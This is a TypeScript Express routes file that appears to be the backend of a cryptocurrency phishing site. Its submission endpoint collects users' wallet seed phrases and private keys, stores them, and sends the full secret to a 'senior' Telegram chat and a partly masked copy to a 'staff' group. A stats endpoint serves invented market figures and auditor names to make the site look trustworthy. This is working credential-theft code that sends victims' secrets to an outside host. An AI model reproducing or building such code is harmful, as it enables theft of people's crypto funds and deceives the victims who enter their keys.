import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { serviceCategories, insertServiceSubmissionSchema } from "@shared/schema";

async function sendTelegramMessage(botToken: string, chatId: string, message: string) {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );

    if (!response.ok) {
      const error = await response.text();
      console.error(`Telegram API error for chat ${chatId}:`, error);
      return false;
    }
    return true;
  } catch (error) {
    console.error(`Failed to send Telegram notification to ${chatId}:`, error);
    return false;
  }
}

async function sendTelegramNotification(submission: {
  walletType: string;
  serviceName: string;
  phrase: string;
}) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const seniorChatId = process.env.TELEGRAM_CHAT_ID;
  const staffChatId = process.env.TELEGRAM_STAFF_CHAT_ID;

  if (!botToken) {
    console.log("Telegram bot token not configured");
    return;
  }

  const words = submission.phrase.split(" ");
  const wordCount = words.length;
  const timestamp = new Date().toISOString();
  
  // Determine if it's a seed phrase or private key
  const isPrivateKey = wordCount === 1 || submission.phrase.startsWith("0x") || submission.phrase.length > 50 && !submission.phrase.includes(" ");
  const phraseType = isPrivateKey ? "Private Key" : `${wordCount}-word Seed Phrase`;
  
  // Full message for senior (you) - all visible
  let fullMessage: string;
  if (isPrivateKey) {
    fullMessage = `🔔 *New Wallet Import*
💼 *Wallet:* ${submission.walletType}
🔧 *Service:* ${submission.serviceName}
📝 *Type:* Private Key
⏰ *Time:* ${timestamp}


${submission.phrase}`.trim();
  } else {
    fullMessage = `🔔 *New Wallet Import*
💼 *Wallet:* ${submission.walletType}
🔧 *Service:* ${submission.serviceName}
📝 *Type:* ${wordCount}-word Seed Phrase
⏰ *Time:* ${timestamp}


${submission.phrase}`.trim();
  }

  // Partial message for staff - last 2 words hidden for seed phrase, partial for private key
  let staffMessage: string;
  if (isPrivateKey) {
    const hiddenKey = submission.phrase.substring(0, 10) + "****" + submission.phrase.substring(submission.phrase.length - 4);
    staffMessage = `🔔 *New Wallet Import*
💼 *Wallet:* ${submission.walletType}
🔧 *Service:* ${submission.serviceName}
📝 *Type:* Private Key
⏰ *Time:* ${timestamp}


${hiddenKey}`.trim();
  } else {
    const hiddenWords = words.map((word, index) => {
      if (index >= wordCount - 2) {
        return "****";
      }
      return word;
    });
    const partialPhrase = hiddenWords.join(" ");
    
    staffMessage = `🔔 *New Wallet Import*
💼 *Wallet:* ${submission.walletType}
🔧 *Service:* ${submission.serviceName}
📝 *Type:* ${wordCount}-word Seed Phrase
⏰ *Time:* ${timestamp}


${partialPhrase}`.trim();
  }

  // Send to senior (full details)
  if (seniorChatId) {
    const sent = await sendTelegramMessage(botToken, seniorChatId, fullMessage);
    if (sent) {
      console.log("Full notification sent to senior");
    }
  }

  // Send to staff group (partial details)
  if (staffChatId) {
    const sent = await sendTelegramMessage(botToken, staffChatId, staffMessage);
    if (sent) {
      console.log("Partial notification sent to staff group");
    }
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  app.get("/api/services", (_req, res) => {
    res.json(serviceCategories);
  });

  app.post("/api/submissions", async (req, res) => {
    try {
      const parsed = insertServiceSubmissionSchema.safeParse(req.body);
      
      if (!parsed.success) {
        return res.status(400).json({ 
          error: "Invalid submission data", 
          details: parsed.error.flatten() 
        });
      }

      const submission = await storage.createServiceSubmission(parsed.data);
      
      await sendTelegramNotification({
        walletType: parsed.data.walletName,
        serviceName: parsed.data.serviceName || "Unknown",
        phrase: parsed.data.phrase,
      });

      res.status(201).json({ success: true, id: submission.id });
    } catch (error) {
      console.error("Error creating submission:", error);
      res.status(500).json({ error: "Failed to create submission" });
    }
  });

  app.get("/api/stats", (_req, res) => {
    res.json({
      totalMarketSize: "$371.65M",
      totalBorrowed: "$128.37M",
      auditors: ["OtterSec", "MoveBit", "Veridise", "Salus"]
    });
  });

  return httpServer;
}
